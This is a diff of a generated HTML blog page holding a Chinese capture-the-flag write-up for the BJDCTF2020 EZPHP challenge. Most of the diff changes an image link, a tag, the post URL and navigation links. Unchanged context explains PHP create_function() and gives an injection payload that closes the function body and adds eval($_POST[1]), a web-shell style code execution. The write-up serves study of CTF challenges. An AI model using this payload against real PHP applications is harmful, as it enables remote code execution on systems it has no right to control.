@@ -729,7 +729,7 @@
 
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>​    可以看到我们如果需要拿到flag就要穿过6个if。据出题人的说法，本题考察的是create_function()函数。题目我看了。看不懂。既然考察的是create_function()。知识点也在我们能力范畴之外。因此跟着出题人的WP复现了一波。</p>
 <h3 id="核心考点：Create-function"><a href="#核心考点：Create-function" class="headerlink" title="核心考点：Create_function()"></a>核心考点：Create_function()</h3><p>用法如下。用于创建一个方法，变量名为方法名，第一个参数为新方法的形参，第二个参数为新方法的内容。</p>
-<p><img "" class="lazyload placeholder" data-original="https://img2020.cnblogs.com/blog/2513159/202108/2513159-20210822205441764-1820785349.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822164953858"></p>
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/OrqZbF4fexNQSwR.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916203131193"></p>
 <p>由于题目中我们的code是可控的，那么我们可以构造如下函数：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myFunc</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return ($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>)</span><br><span class="line">    <span class="comment">#如此一来执行的myFunc就变成了</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$a</span>+<span class="variable">$b</span>);&#125;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);\\</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -815,8 +815,8 @@
         
         <div class="tags">
           
-            <a href="/tags/CTF/" class="">
-              CTF
+            <a href="/tags/CTF-web/" class="">
+              CTF-web
             </a>
           
         </div>
@@ -830,7 +830,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2021/09/14/hello-world/" target="_blank" title="BJCTF2020-EZPHP">https://k1he.github.io/2021/09/14/hello-world/</a>
+    <a href="/2021/09/14/BJDCTF2020-EZPHP/" target="_blank" title="BJCTF2020-EZPHP">https://k1he.github.io/2021/09/14/BJDCTF2020-EZPHP/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -850,19 +850,18 @@
 
   
   <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img lazyload" data-original="/medias/9.jpg" style="background-size: cover; 
+    <div class="post-nav-img lazyload" data-original="/medias/1.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/09/15/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/" class="post-nav-link">
+    <a href="/2021/09/16/CTFSHOW_PHP%E7%89%B9%E6%80%A7/" class="post-nav-link">
       <div class="title">
         <i class="fa fa-angle-left"></i> 上一篇:
-        <div class="title-text">测试文章</div>
+        <div class="title-text">CTFSHOW-PHP特性</div>
       </div>
       
       <!-- <div class="content">
-        这是一篇测试文章用于测试图片是否而可用。
-
-
+        ﻿﻿# web 89:数组绕过正则
+12345678910111213141516&lt;?phpinclude(&qu
       </div> -->
     </a>
   </div>
